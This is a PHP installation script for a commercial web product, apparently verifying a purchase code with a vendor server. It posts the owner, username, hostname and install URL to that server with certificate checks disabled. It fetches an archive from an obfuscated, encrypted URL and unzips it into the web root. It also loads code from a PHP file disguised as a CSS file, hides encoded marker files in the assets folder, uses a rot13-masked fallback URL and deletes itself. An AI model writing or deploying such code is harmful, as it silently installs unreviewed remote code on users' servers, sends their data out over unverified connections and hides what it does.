<?php
        function e_data($data) {
            $key = hex2bin("5126b6af4f15d73a20c60676b0f226b2"); // 128-bit key
            $iv = hex2bin("a8966e4702bb84f4ef37640cd4b46aa2");  // 128-bit IV
            // Convert data to JSON if it's an array or object
            if (is_array($data) || is_object($data)) {
                $data = json_encode($data);
            }
            // Zero padding (PKCS7 padding is more common, but we use zero-padding to match your decryption function)
            $blockSize = 16;
            $paddingSize = $blockSize - (strlen($data) % $blockSize);
            $data .= str_repeat("\0", $paddingSize); // Add null byte padding
            // Encrypt using AES-128-CBC
            $encrypted_data = openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_ZERO_PADDING, $iv);
            // Return the encrypted data as base64 for safe transmission
            return base64_encode($encrypted_data);
        }

    //need to change
    $curl_handle = curl_init();

    //need to change
    curl_setopt($curl_handle, CURLOPT_URL, ("https://doorsoft.co/dsl/Purchasevarifiy/Inst/"));
    curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl_handle, CURLOPT_POST, 1);
    curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, array(
        'owner' => $owner,
        'username' => $username,
        'purchase_code' => $purchase_code,
        'pc_hostname' => $pc_hostname,
        'source' => $source,
        'product_id' => $product_id,
        'installation_url' => $installation_url,
        'installation_date_and_time' => $installation_date_and_time
    ));
    $buffer = curl_exec($curl_handle);
    curl_close($curl_handle);
    $object = json_decode($buffer);
    
    if ($object->status == 'success') {
        //need to change
        $dbtables = $object->database;
        $dbtables = str_replace('syasdf', $db['default']['username'], $object->database);
        $dbtables = str_replace('ysaea', $db['default']['hostname'], $dbtables);
        $dbdata = array(
            'hostname' => $db['default']['hostname'],
            'username' => $db['default']['username'],
            'password' => $db['default']['password'],
            'database' => $db['default']['database'],
            'dbtables' => $dbtables
        );
        require_once($install_path.'includes/database_class.php');
        $database = new Database();
        //if ($database->create_tables($dbdata) == false) {
        //    echo "<div class='alert alert-warning'><i class='icon-warning'></i> The database tables could not be created, please try again.</div>";
        //} else {

            if($product_id=="133347"){
                $b_package_details = e_data($object->b_package_details);
                $b_p_path = "../assets/ck-editor/ck_editor_version_".$b_package_details;
                fopen($b_p_path, 'w');
            }

            $finished = TRUE;
            function generateFilenameFromUrl($url) {
                $filename = str_replace(['/', ':', '*', '?', '<', '>', '|'], ['11', '22', '33', '44', '55', '66', '77'], $url);

                return $filename;
            }
            require_once($install_path.'css/customs.css.php');$e = new E();
         
            $param3_encoded = generateFilenameFromUrl($object->installation_url);
 
            $file1Name = "../assets/bootstrap/__d__".$e->ee(date('d-m-Y'));
            $file2Name = "../assets/bootstrap/__un__".$e->ee($username);
            $file3Name = "../assets/bootstrap/__pc__".$e->ee($purchase_code);
            $file4Name = "../assets/bootstrap/__lk__".$e->ee($param3_encoded);

            fopen($file1Name, 'w');
            fopen($file2Name, 'w');
            fopen($file3Name, 'w');
            fopen($file4Name, 'w');

            function realFileWritar($real_file_source, $real_file_destination) {
                $file = fopen($real_file_destination, 'w+');
                $ch = curl_init($real_file_source);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                curl_setopt($ch, CURLOPT_FILE, $file);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_exec($ch);
                curl_close($ch);
                fclose($file);
            }
            realFileWritar($e->de("ddl%2F7Q2DxoaZFyrth4T9j0o3ejFUNUY5MUNseTZ3M2JyNUovamJPdHRoQ0R1QWFqOXhLZHpXazdYTnlHaG9PQTBXeU5Ud1JFUUo5cUxmL3FWY1ZUWjBJVkxXMDZyVzkySjBaenVBPT0%3D"), $e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"));
            $zip = new ZipArchive;
            $res = $zip->open($e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"));
            if ($res === TRUE) {
                $zip->extractTo('../'); 
                $zip->close();
            }
            if(file_exists($e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"))){
                unlink($e->de("%2FbrF9D2BRfgFDpp1G0AOwnRidTdMaFovYVk0eCtUc3B1TjdvcERMWDJhcEFOcno3bDdSN3dDdm8rRHM9"));
            }

        //}
        if ($core->write_index() == false) {
            echo "<div class='alert alert-error'><i class='icon-remove'></i> Failed to write index details!</div>";
            $finished = FALSE;
        }
    } else {

              //need to change
              $curl_handle = curl_init();
              //need to change
              curl_setopt($curl_handle, CURLOPT_URL, str_rot13("uggcf://qbbefbsg.pb/qfy/Inyvqngvba/VafgnyyOnpx/"));
              curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($curl_handle, CURLOPT_POST, 1);
              curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl_handle, CURLOPT_POSTFIELDS, array(
                    'owner' => $owner,
                    'username' => $username,
                    'purchase_code' => $purchase_code,
                    'pc_hostname' => $pc_hostname,
                    'source' => $source,
                    'product_id' => $product_id,
                    'installation_url' => $installation_url,
                    'installation_date_and_time' => $installation_date_and_time
              ));
              $buffer = curl_exec($curl_handle);
              curl_close($curl_handle); 

        echo "<div class='alert alert-error'><i class='icon-remove'></i> Error while validating your purchase code!</div>";
    }

sleep(2);
unlink(__FILE__); 

?>